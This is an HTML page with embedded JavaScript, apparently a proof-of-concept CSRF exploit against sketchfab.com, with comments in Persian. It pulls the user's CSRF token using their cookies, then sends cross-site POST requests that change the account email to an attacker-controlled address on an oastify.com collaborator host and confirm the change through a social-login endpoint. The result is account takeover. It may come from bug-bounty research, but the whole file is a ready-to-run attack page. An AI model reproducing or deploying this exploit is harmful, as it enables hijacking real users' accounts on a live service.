<!DOCTYPE html>
<html>
<head>
    <title>CSRF Exploit (Fetch for GET, XHR for POSTs)</title>
</head>
<body>
    <h1>Processing...</h1>
    <p id="status">Initializing...</p>

    <script>
        // تأخیر
        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        // ------------------------------------------
        // درخواست اول: GET با fetch و تنظیم Referer
        // ------------------------------------------
        async function extractCsrfTokenFromSetCookie() {
            const url = 'https://sketchfab.com/settings/email';
            const response = await fetch(url, {
                method: 'GET',
                credentials: 'include',      // ارسال کوکی‌ها
                referrer: 'https://sketchfab.com/settings/profile',  // تنظیم Referer دلخواه
                referrerPolicy: 'unsafe-url', // اجازه ارسال Referer کامل
                headers: {
                    'Accept': 'text/html,application/xhtml+xml'
                }
            });

            if (!response.ok) {
                throw new Error(`GET failed with status ${response.status}`);
            }

            // دریافت هدر Set-Cookie
            const setCookieHeader = response.headers.get('set-cookie');
            if (!setCookieHeader) {
                throw new Error('Set-Cookie header not found');
            }

            // استخراج sb_csrftoken
            const match = setCookieHeader.match(/sb_csrftoken=([^;]+)/);
            if (!match || !match[1]) {
                throw new Error('sb_csrftoken not found in Set-Cookie');
            }
            return match[1];
        }

        // ------------------------------------------
        // درخواست دوم: POST تغییر ایمیل (XHR)
        // ------------------------------------------
        function changeEmail(csrfToken, emailAddress) {
            return new Promise((resolve, reject) => {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', 'https://sketchfab.com/settings/email/sso-verify-callback', true);
                xhr.withCredentials = true;
                xhr.setRequestHeader('Content-Type', 'application/json');
                xhr.setRequestHeader('X-Csrftoken', csrfToken);

                xhr.onreadystatechange = function() {
                    if (xhr.readyState === XMLHttpRequest.DONE) {
                        if (xhr.status === 200) {
                            try {
                                const resp = JSON.parse(xhr.responseText);
                                if (resp.success === true) resolve(true);
                                else reject(new Error('success=false'));
                            } catch(e) { reject(e); }
                        } else {
                            reject(new Error(`POST1 status ${xhr.status}`));
                        }
                    }
                };
                xhr.onerror = () => reject(new Error('Network error in changeEmail'));
                const payload = JSON.stringify({ email: emailAddress });
                xhr.send(payload);
            });
        }

        // ------------------------------------------
        // درخواست سوم: POST تایید (XHR)
        // ------------------------------------------
        function confirmEmail(csrfToken) {
            return new Promise((resolve, reject) => {
                const xhr = new XMLHttpRequest();
                xhr.open('POST', 'https://sketchfab.com/social/login/epic/', true);
                xhr.withCredentials = true;
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

                xhr.onreadystatechange = function() {
                    if (xhr.readyState === XMLHttpRequest.DONE) {
                        // ریدایرکت 302 توسط XHR خودکار دنبال می‌شود
                        if (xhr.status >= 200 && xhr.status < 400) {
                            resolve(true);
                        } else {
                            reject(new Error(`POST2 status ${xhr.status}`));
                        }
                    }
                };
                xhr.onerror = () => reject(new Error('Network error in confirmEmail'));
                const params = new URLSearchParams({
                    'csrfmiddlewaretoken': csrfToken,
                    'next': '/settings/email/sso-verify-callback'
                });
                xhr.send(params.toString());
            });
        }

        // ------------------------------------------
        // اجرای اصلی
        // ------------------------------------------
        (async function() {
            try {
                const statusDiv = document.getElementById('status');
                statusDiv.innerText = 'Extracting CSRF token via fetch (with Referer)...';
                const csrfToken = await extractCsrfTokenFromSetCookie();
                console.log('[+] CSRF token extracted:', csrfToken);
                statusDiv.innerText = 'Token extracted. Sending email change request...';

                // آدرس ایمیل جدید همراه با Collaborator خود را جایگزین کنید
                const emailAddress = 'pouryet3@gmail.com.gzjkg2psu523o7ao6del6o1ib9h050tp.oastify.com'; // 👈 تغییر دهید
                await changeEmail(csrfToken, emailAddress);
                console.log('[+] Email change request sent');
                statusDiv.innerText = 'Email change initiated. Waiting 2 seconds...';
                await delay(2000);

                statusDiv.innerText = 'Sending confirmation request...';
                await confirmEmail(csrfToken);
                console.log('[+] Confirmation request completed');
                statusDiv.innerText = 'Exploit completed!';
                document.body.innerHTML = '<h2 style="color:green">Success! Email address changed.</h2>';
            } catch (err) {
                console.error('[-] Exploit error:', err);
                document.getElementById('status').innerText = 'Error: ' + err.message;
                document.body.innerHTML += '<p style="color:red">Exploit failed. Check console.</p>';
            }
        })();
    </script>
</body>
</html>
